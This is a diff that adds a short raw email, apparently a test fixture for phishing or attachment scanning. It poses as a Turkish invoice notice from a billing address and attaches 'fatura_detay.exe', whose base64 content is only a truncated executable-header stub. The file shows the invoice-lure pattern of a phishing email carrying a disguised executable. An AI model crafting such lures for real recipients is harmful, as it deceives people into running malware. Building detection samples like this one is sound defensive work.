@@ -1,0 +1,19 @@
+From: billing@invoice-dept.com
+To: user@example.com
+Subject: Fatura ve Odeme Dokumani
+Date: Tue, 8 Sep 2026 11:30:00 +0300
+Authentication-Results: mx.google.com; spf=pass dkim=neutral
+Content-Type: multipart/mixed; boundary="BOUNDARY999"
+
+--BOUNDARY999
+Content-Type: text/plain; charset="utf-8"
+
+Sayin musterimiz, agustos ayi faturaniz ektedir.
+
+--BOUNDARY999
+Content-Type: application/x-msdownload; name="fatura_detay.exe"
+Content-Disposition: attachment; filename="fatura_detay.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA
+--BOUNDARY999--
